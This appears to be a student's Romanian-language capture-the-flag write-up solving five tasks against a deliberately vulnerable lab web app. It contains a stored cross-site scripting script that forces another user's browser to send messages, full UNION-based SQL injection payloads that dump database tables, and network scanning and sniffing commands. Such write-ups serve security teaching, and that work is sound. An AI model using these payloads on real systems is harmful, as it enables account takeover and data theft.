Cerinta 1 - SpeishFlag{kkf8PxAGMcHBfwKN2KonvGzLy27CLC2u} 
Pentru a putea intra pe site am folosit scriptul connect.sh din arhiva. Am dat ls si am observat ca exista scriptul webtunnel.sh pentru a ne conecta care avea nevoie de 2 parametrii - adresa ip a serverului web si port. Am dat ```ip address show``` si am dat nmap pe reteaua locala ```nmap -Pn 172.22.0.4/16``` si am luat serverul care are doar serviciul http deschis din output:
Nmap scan report for 172.22.0.206
Host is up (0.000013s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:16:00:03 (Unknown)

```./webtunnel.sh 172.22.0.206 80 &```

apoi am pus in bara de search web http://localhost:8080.

Am observat ca butonul de register ma duce spre calea /auth/fake_login, asa ca m-am uitat in codul sursa HTML al paginii, unde am gasit un comentariu catre likul real de login: /auth/register_real_one. Mi-am facut cont, m-am logat cu el si m-am uitat din nou in codul sursa al paginii, de data aceasta in cel al caii: /inside, am dat search dupa SpeishFlag si am gasit flag-ul: SpeishFlag{kkf8PxAGMcHBfwKN2KonvGzLy27CLC2u} 

Cerinta 2 - SpeishFlag{4xGe2CQgV2LKDfbtQgTtglUGRaj9KqDh}
Prima data am incercat sa ii dau friend request bossului, dar nu a mers. M-am uitat in codul site-ului si apoi in main.js si am observat ca pot apela, de pe profilul meu, acceptFriend(boss_id) ca bossul sa imi accepte si el cererea si am observat in codul site-ului ca id ul boss-ului este 1: ```<div class="box profile-view" data-user-id="1">``` . Am apelat ```acceptFriend(1)```, insa nu a functionat. M-am uitat la hint ul din README si am observat ca prietenul comun intre mine si boss este Nyan asa ca i-am trimis un mesaj cu un script in care am apelat acceptFriend(9) pentru a il face pe boss sa ne accepte cererea de prietenie:
```<script>
$(function() {
    if (window.authUserName === 'nyan') {
        var form = document.getElementsByTagName("form")[0];

        if (form) {
            form.action = "/inside/message/send/1";

            var text = form.getElementsByTagName("text")[0];

            if (text) {
                text.value = "<script> $(function() { acceptFriend(9) }); <\/script>";
            }
            form.submit();
        }
    }
});
</script>```

Dupa am gasit pe wall-ul bossului flag-ul.

Cerinta 3 - SpeishFlag{DDYdFlk1s4Y55OGHO6iVkjQbLW992Zky}
M-am luat dupa hint si am cautat in postarile boss-ului si am vazut ca exista un script numit backup.sh, asa ca am accesat localhost:8080/backup.sh de unde s-a descarcat scriptul:
```#!/bin/bash
# Dis iz mah backup script
# Powered by cat, ofc!

echo "can you guess what you'll find in here?" > /tmp/flag.txt
tar czf /tmp/flag.tar.gz -C /tmp/ flag.txt
# Backup website
tar czf backup-orig.tar.gz -C /var/www/ .
# Let the cat do its thing
DATE=$(date +'%Y-%m-%d' -d "$(( RANDOM % 15 + 2 )) days ago")
cat backup-orig.tar.gz /tmp/flag.tar.gz > backup-$DATE.tar.gz
rm -f backup-orig.tar.gz```

Am luat comanda ```DATE=$(date +'%Y-%m-%d' -d "$(( RANDOM % 15 + 2 )) days ago")``` si apoi am dat ```echo
$DATE``` care mi-a intors data 2023-12-29. Asa ca am incercat 127.0.0.1:8080/backup-2023-12-29.tar.gz. Intrucat am vazut ca este intors random, am tot repetat procesul anterior pana cand am gasit ca localhost:8080/backup-2023-12-30.tar.gz imi descarca o alta arhiva. 
Am incercat sa dezarhivez si sa caut flag-ul dar nu a mers, am dat ```xxd -l 256 backup-2023-12-30.tar.gz``` pe arhiva si am observat ca incepe cu 1f 8b 08.
Am dat search dupa string-ul gasit in hexedit si am gasit: ---  backup-2023-12-30.tar.gz       --0xB0155/0xB022C--100%--------------------

Apoi am extras ultima parte a arhivei intr-o alta arhiva:
 tail -c +$((16#B0150)) backup-2023-12-30.tar.gz > flag.tar.gz

Am dezarhivat arhiva si am gasit flag-ul:
SpeishFlag{DDYdFlk1s4Y55OGHO6iVkjQbLW992Zky}
https://www.youtube.com/watch?v=28MnGe1Rr18

Cerinta 4 - SpeishFlag{5T03leSm78BsIchrKdVFZTC2ooqcxPkA}
Folsind sqlmap, am vazut ca endpointul vulnerabil este http://localhost:8080/inside/p/. ID-ul care urmeaza dupa /p/ este trimis direct in cererea catre baza de date.

M-am logat si am apelat ```http://localhost:8080/inside/p/'%20or%201%20order%20by%201,2,3,4,5,6,7,8,9,10%20--%20x``` echivalent ```' or 1 order by 1,2,3,4,5,6,7,8,9,10 -- x```

Output: 
Fatal error: Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column '9' in 'order clause' in /var/www/lib/Database.php:45 Stack trace: #0 /var/www/lib/Database.php(45): PDO->prepare() #1 /var/www/controllers/inside/Profile.php(24): Database->Query() #2 /var/www/lib/Controller.php(63): Profile->index() #3 /var/www/controllers/inside/Index.php(46): Controller->Dispatch() #4 /var/www/index.php(30): Index->Dispatch() #5 {main} thrown in /var/www/lib/Database.php on line 45 

Daca nu poate accesa coloana 9 => sunt 8 coloane

Apoi, ca la laborator am folosit ' union select 1, 2, 3, 4, 5, 6, 7, 8 from information_schema.tables -- x
pentru a afla ce coloana este afisata => coloana 3 (profilul boss-ului)

Pentru a afla din ce tabela face parte flag-ul: ```' union select 1, 2, group_concat(distinct(table_schema) separator ','), 4, 5, 6, 7, 8 from information_schema.tables -- x``` => information_schema,performance_schema,web_4407's Profile 6

Am folosit schema pentru a afla numele tabelelor din schema:
' union select 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 from information_schema.tables where table_schema='web_4407' -- x => accounts,flags74513,friends,messages,posts's Profile 6

Pentru a afla numele coloanelor din flags74513 am folosit
' union select 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 from information_schema.columns where table_schema='web_4407' and table_name='flags74513' -- x => id,zaflag's Profile 6

Pentru a obtine flag ul am folosit:

' union select 1, 2, zaflag, 4, 5, 6, 7, 8 from web_4407.flags74513 -- x => SpeishFlag{5T03leSm78BsIchrKdVFZTC2ooqcxPkA}'s Profile 6

Flag-ul: SpeishFlag{5T03leSm78BsIchrKdVFZTC2ooqcxPkA}


Cerinta 5 - SpeishFlag{zOKMVEVLKr4AcoGIUcNKyZs52Ys8PZ83}
Am rulat comanda ```./webtunnel.sh 172.22.0.206 80 &``` in background si apoi am dat comanda:
tcpdump -i eth0 host 192.168.160.206 and \(port 80 or icmp\) and icmp[icmptype] == 3
unde ip-ul este ip-ul masinii de pe eth0, m-am logat pe site si am observat urmatoarea linie:
14:41:05.536282 IP dev-machine > 192.168.160.206: ICMP dev-machine udp port 10441 unreachable, length 181

Asa ca am luat portul si dat netcat pe el ```nc -lu 10441``` pentru a vedea daca va scrie ceva si am obtinut(dupa ce am accesat profilul lui nyan):
NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.U3BlaXNoRmxhZ3t6T0tNVkVWTEtyNEFjb0dJVWNOS3laczUyWXM4UFo4M30=NYAN.NYAN.NYAN.NYAN.NYAN

Am luat textul si i-am dat decode din base64 pe modul auto folosind site-ul de mai jos si am obtinut flag-ul:
https://www.base64decode.org/

```5€
5€
5€
5€
5€
5€
5€
5€
5€
5€
5€
SpeishFlag{zOKMVEVLKr4AcoGIUcNKyZs52Ys8PZ83}```





